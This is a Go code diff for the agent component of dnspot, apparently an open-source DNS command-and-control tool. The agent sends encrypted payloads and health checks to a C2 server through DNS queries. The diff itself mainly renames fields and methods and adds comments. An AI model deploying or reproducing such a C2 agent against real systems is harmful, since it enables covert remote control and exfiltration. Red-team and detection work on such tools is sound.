@@ -15,6 +15,9 @@ import (
 	"github.com/mosajjal/dnspot/cryptography"
 )
 
+// Agent is a DNS C2 client. It tries to connect to the C2 either directly or
+// by having one or more recursive DNS servers between the two. The only authentication
+// between the two is a set of public keys and private keys.
 type Agent struct {
 	CommandTimeout        time.Duration
 	PrivateKeyBase36      string
@@ -22,7 +25,7 @@ type Agent struct {
 	ServerAddress         string
 	ServerPublicKeyBase36 string
 	serverPublicKey       *cryptography.PublicKey
-	DnsSuffix             string
+	DNSSuffix             string
 	io                    IO
 	r                     runtime
 }
@@ -36,6 +39,9 @@ const (
 	FATAL
 )
 
+// IO is designed to decouple inputs and outputs of agents from the underlying logic
+// this way web interfaces, TUI and CLI development is possible. it also enables dnspot
+// to become easy to embed in larger frameworks
 type IO interface {
 	Logger(level uint8, format string, args ...interface{})
 	GetInputFeed() chan string
@@ -131,9 +137,9 @@ func (a *Agent) handleServerCommand(msgList []c2.MessagePacketWithSignature) err
 			payload := []byte("Ack!")
 			// Config.io.Logger(INFO,"sending plyload %#v\n", msg)
 			// time.Sleep(2 * time.Second)
-			Questions, _, err := c2.PreparePartitionedPayload(msg, payload, a.DnsSuffix, a.privateKey, a.serverPublicKey)
+			Questions, _, err := c2.PreparePartitionedPayload(msg, payload, a.DNSSuffix, a.privateKey, a.serverPublicKey)
 			for _, Q := range Questions {
-				err = a.SendQuestionToServer(Q)
+				err = a.sendQuestionToServer(Q)
 				if err != nil {
 					a.io.Logger(INFO, "Error sending Message to Server: %s", err)
 				}
@@ -185,7 +191,7 @@ func (a *Agent) SendMessageToServer(msg string) {
 	a.r.NextPayload = []byte(msg)
 }
 
-func (a *Agent) SendQuestionToServer(Q string) error {
+func (a *Agent) sendQuestionToServer(Q string) error {
 	if len(Q) < 255 {
 		// todo: implement retry here
 		// todo: handle response form server
@@ -193,7 +199,7 @@ func (a *Agent) SendQuestionToServer(Q string) error {
 		if err != nil {
 			return fmt.Errorf("failed to send the payload: %s", err)
 		}
-		msgList, skip, err := c2.DecryptIncomingPacket(response, a.DnsSuffix, a.privateKey, a.serverPublicKey)
+		msgList, skip, err := c2.DecryptIncomingPacket(response, a.DNSSuffix, a.privateKey, a.serverPublicKey)
 		if err != nil && !skip {
 			return fmt.Errorf("error in decrypting incoming packet from server: %s", err)
 		} else if !skip {
@@ -212,12 +218,12 @@ func (a *Agent) sendHealthCheck() error {
 	}
 	// set payload based on next message type?
 	payload := []byte("Ping!")
-	Questions, _, err := c2.PreparePartitionedPayload(msg, payload, a.DnsSuffix, a.privateKey, a.serverPublicKey)
+	Questions, _, err := c2.PreparePartitionedPayload(msg, payload, a.DNSSuffix, a.privateKey, a.serverPublicKey)
 	if err != nil {
 		a.io.Logger(WARN, "Error sending Message to Server: %s", err)
 	}
 	for _, Q := range Questions {
-		err = a.SendQuestionToServer(Q)
+		err = a.sendQuestionToServer(Q)
 		if err != nil {
 			a.io.Logger(WARN, "Error sending Healthcheck: %s", err)
 		}
@@ -225,6 +231,7 @@ func (a *Agent) sendHealthCheck() error {
 	return nil
 }
 
+// Run starts an Agent instance  given the IO interface.
 func (a *Agent) Run(serverIo IO) {
 	a.r.PacketBuffersWithSignature = make(map[int][]c2.MessagePacketWithSignature)
 	a.io = serverIo
@@ -243,11 +250,11 @@ func (a *Agent) Run(serverIo IO) {
 	a.r.NextMessageType = c2.MessageHealthcheck
 	a.r.MessageTicker = time.NewTicker(a.r.HealthCheckInterval)
 
-	if !strings.HasSuffix(a.DnsSuffix, ".") {
-		a.DnsSuffix = a.DnsSuffix + "."
+	if !strings.HasSuffix(a.DNSSuffix, ".") {
+		a.DNSSuffix = a.DNSSuffix + "."
 	}
-	if !strings.HasPrefix(a.DnsSuffix, ".") {
-		a.DnsSuffix = "." + a.DnsSuffix
+	if !strings.HasPrefix(a.DNSSuffix, ".") {
+		a.DNSSuffix = "." + a.DNSSuffix
 	}
 
 	var err error
@@ -288,12 +295,12 @@ func (a *Agent) Run(serverIo IO) {
 						MessageType: a.r.NextMessageType,
 					}
 					payload := []byte(a.r.NextPayload)
-					Questions, _, err := c2.PreparePartitionedPayload(msg, payload, a.DnsSuffix, a.privateKey, a.serverPublicKey)
+					Questions, _, err := c2.PreparePartitionedPayload(msg, payload, a.DNSSuffix, a.privateKey, a.serverPublicKey)
 					if err != nil {
 						a.io.Logger(WARN, "Error sending Message to Server 1") //todo:update msg
 					}
 					for _, Q := range Questions {
-						err = a.SendQuestionToServer(Q)
+						err = a.sendQuestionToServer(Q)
 						if err != nil {
 							a.io.Logger(INFO, "Error sending Message to Server 2: %s", err) //todo:update msg
 						}
